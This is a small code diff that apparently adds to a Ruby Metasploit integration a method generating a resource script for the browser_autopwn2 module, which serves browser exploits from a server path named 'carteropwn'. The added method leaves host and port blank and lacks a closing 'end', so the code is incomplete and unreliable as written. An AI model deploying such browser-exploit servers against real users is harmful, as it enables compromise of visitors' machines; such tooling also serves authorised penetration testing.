@@ -141,6 +141,14 @@ class Metasploit
            "exploit -j\n"
   end
 
+  def generate_autopwn2_script(payload, ds)
+    datastore = generate_datastore(payload, ds)
+    return "use auxiliary/server/browser_autopwn2\n" +
+           "set SRVHOST \n" +
+           "set SRVPORT \n" +
+           "set URIPATH carteropwn\n" +
+           "exploit\n"
+
   private
 
   def generate_datastore(payload, ds)
